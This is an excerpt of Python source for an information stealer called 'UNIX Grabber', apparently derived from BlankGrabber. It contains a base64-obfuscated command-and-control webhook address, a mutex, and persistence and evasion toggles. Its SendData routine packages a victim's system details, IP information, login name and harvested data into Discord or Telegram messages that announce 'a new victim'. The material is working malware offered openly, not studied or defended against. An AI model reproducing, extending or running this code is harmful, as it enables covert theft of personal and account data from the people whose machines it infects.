...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MzYyOTkyMDkyODEzNzMzNy92T2xYMENFNW5vcXpfaTNEWlRRR01UMHhJMkxQdkduQXZDbTA0SHZtRTBPX2JoOXpFbm5nbGVOQ0hmbkRMMURJYW9Haw==').decode())
    Mutex = base64.b64decode('TDVTUFJsYjBLOFJ6cWhVbg==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
...
Logger = logging.getLogger('UNIX Grabber')
...
class BlankGrabber:
    ...
    def SendData(self) -> None:
        ...
        match Settings.C2[0]:
            case 0:
                image_url = 'https://i.postimg.cc/0QGN48yG/unixgrabber.jpg'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'UNIX Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/ UNIX', 'color': 34303, 'footer': {'text': 'Grabbed By Unix'}, 'thumbnail': {'url': image_url}}], 'username': 'UNIX Grabber', 'avatar_url': image_url}
            ...
            case 1:
                payload = {'caption': f'<b>UNIX Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
